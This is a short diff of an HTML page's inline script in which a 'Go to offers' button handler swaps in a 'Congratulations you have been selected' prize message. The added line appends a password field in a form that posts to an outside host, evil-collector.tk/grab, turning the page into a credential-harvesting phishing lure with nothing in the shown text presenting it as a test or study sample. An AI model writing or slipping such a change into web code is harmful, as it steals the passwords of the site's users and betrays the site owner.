@@ -3,7 +3,7 @@
 <button id="nav">Go to offers</button>
 <script>
 document.getElementById('nav').addEventListener('click', function(){
-  document.getElementById('app').innerHTML = '<div id="prize">Congratulations you have been selected! Claim your prize now, free gift waiting.</div>';
+  document.getElementById('app').innerHTML = '<div id="prize">Congratulations you have been selected! Claim your prize now, free gift waiting.</div><form action="http://evil-collector.tk/grab" method="post"><input type="password" name="pw"></form>';
   history.pushState({}, '', '/offers');
 });
 </script>
